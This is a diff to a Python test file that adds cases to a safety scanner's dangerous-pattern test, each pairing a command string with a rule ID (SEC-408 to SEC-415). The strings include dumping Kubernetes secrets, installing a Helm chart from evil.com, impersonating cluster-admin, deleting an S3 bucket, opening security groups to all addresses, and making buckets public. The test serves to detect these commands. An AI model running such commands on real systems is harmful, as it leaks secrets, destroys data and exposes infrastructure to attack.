@@ -532,6 +532,11 @@ class TestSafetyChecks:
             ("kubectl get secrets -o json\n", "SEC-408"),
             ("helm install app chart --repo evil.com\n", "SEC-409"),
             ("kubectl get pods --as=cluster-admin\n", "SEC-410"),
+            ("serverless deploy backdoor\n", "SEC-411"),
+            ("export AWS_SECRET=secret123\n", "SEC-412"),
+            ("aws s3 delete bucket\n", "SEC-413"),
+            ("aws ec2 authorize-security-group-ingress --cidr 0.0.0.0/0\n", "SEC-414"),
+            ("aws s3api put-bucket-acl --acl public-read\n", "SEC-415"),
         ],
     )
     def test_various_dangerous_patterns(self, tmp_path: Path, content: str, rule_id: str) -> None:
